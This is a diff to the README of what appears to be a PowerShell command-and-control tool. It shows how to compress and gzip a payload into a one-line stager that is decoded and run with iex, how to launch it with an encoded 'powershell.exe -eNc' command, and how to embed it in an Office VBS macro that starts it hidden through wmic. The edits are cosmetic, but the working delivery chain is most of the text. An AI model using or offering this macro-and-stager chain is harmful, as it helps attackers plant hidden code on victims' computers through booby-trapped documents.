@@ -12,7 +12,7 @@
 
 ```powershell
 # read in UTF8 encoded file data
-$utf8 = [system.io.file]::readallbytes('client.ps1');
+$utf8 = [system.io.file]::readallbytes('<path to client.ps1>');
 $text = [system.text.encoding]::utf8.getstring($utf8);
 # compress payload into one line
 $text = $text.replace("  ","").replace("`n","").replace("`r","");
@@ -38,14 +38,14 @@ $m.write($d,0,$d.length);
 $m.seek(0,0)|out-null;
 $z=new-object system.io.compression.gzipstream($m,[system.io.compression.compressionmode]::decompress);
 $s=new-object system.io.streamreader($z);
-iex($s.readtoend()); 
+iex($s.readtoend())
 ```
 
 - Save the previous script with your `<PAYLOAD>` as `stager.ps1` and run the following PowerShell:
 
 ```powershell
 # read in UTF8 encoded file data
-$utf8 = [system.io.file]::readallbytes('stager.ps1');
+$utf8 = [system.io.file]::readallbytes('<path to stager.ps1>');
 $text = [system.text.encoding]::utf8.getstring($utf8);
 # compress stager into one line
 $text = $text.replace("`n","").replace("`r","");
@@ -62,7 +62,7 @@ $unicode = [system.text.encoding]::convert(
   - More information about PowerShell obfuscation can be found [here](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492186586.pdf)
 
 ```
-powershell.exe -nOpR -nonI -eNc <STAGER>
+powershell.exe -eNc <STAGER>
 ```
 
 - If you are looking for a VBS macro for embedding your payload into a Microsoft Office document, here is one that uses the same `<STAGER>` from the previous steps:
@@ -70,7 +70,7 @@ powershell.exe -nOpR -nonI -eNc <STAGER>
 ```vbscript
 Private Sub run()
   Dim cmd As String
-  cmd = "wmic process call create 'powershell.exe -nOpR -nonI -eNc <STAGER>'"
+  cmd = "wmic process call create 'powershell.exe -eNc <STAGER>'"
   Set sh = CreateObject("WScript.Shell")
   res = sh.run(cmd,0,True)
 End Sub
@@ -91,13 +91,9 @@ End Sub
 - Here are some fun PowerShell test commands :wink::
 
 ```powershell
-(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')
+(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom');
 $e=new-object -com internetexplorer.application; 
 $e.visible=$true;
 $e.navigate('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
 ```
-
-## TODO:
-
-- [ ] Add better handling of orphaned child `iexplore.exe` processes due to errors in `client.ps1`
 
